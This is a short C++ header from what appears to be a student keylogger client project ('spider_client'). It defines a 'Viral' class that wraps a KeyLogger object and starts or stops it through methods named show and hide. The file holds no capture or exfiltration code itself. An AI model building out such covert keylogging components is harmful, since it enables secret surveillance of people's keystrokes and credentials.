/*
** Viral.hpp for spider_client
**
** Made by King
** Login   <arthur.cros@epitech.net>
**
** Started on  Fri Sep 29 17:46:11 2017 King
**
*/

#ifndef SPIDER_CLIENT_VIRAL_HPP
#define SPIDER_CLIENT_VIRAL_HPP

#include <KeyLogger/KeyLogger.hpp>
#include "Configuration.hpp"

#define LOG_VIRAL "{'Viral'}"

namespace spi
{
    class Viral
    {
    public:
        Viral() = default;

        ~Viral() noexcept
        {
          _log(logging::Info) << LOG_VIRAL << " shutting down." << std::endl;
        }

        void hide() const noexcept
        {
            _keylogger->stop();
        }

        void show() const noexcept
        {
            _keylogger->run();
        }

        void setup(KeyLogger *keylogger) noexcept
        {
            _keylogger = keylogger;
            _log(logging::Info) << LOG_VIRAL << " Successfully initialized" << std::endl;
        }

    private:
      logging::Logger _log{"spider-viral", logging::Level::Debug};
        KeyLogger *_keylogger{nullptr};
    };
}
#endif //SPIDER_CLIENT_VIRAL_HPP
